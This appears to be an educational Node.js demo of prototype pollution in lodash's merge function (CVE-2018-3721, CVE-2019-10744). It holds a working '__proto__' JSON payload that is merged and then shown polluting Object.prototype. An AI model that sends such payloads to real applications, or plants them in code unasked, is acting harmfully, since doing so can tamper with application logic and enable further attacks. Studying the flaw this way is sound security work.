/*
 * Very good resource explaining things in more detail:
 * https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7
 * 
 * This example is built off the one described down the page:
 * 
 * "CVE-2018–3721, CVE-2019–10744: Prototype pollution attack through lodash"
 * 
 */
var _= require('lodash');
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';

var a = {};
console.log("Before : " + a.oops);
_.merge({}, JSON.parse(malicious_payload));
console.log("After : " + a.oops);
console.log("After again : " + oops);
console.log("After again again : " + Object. oops);
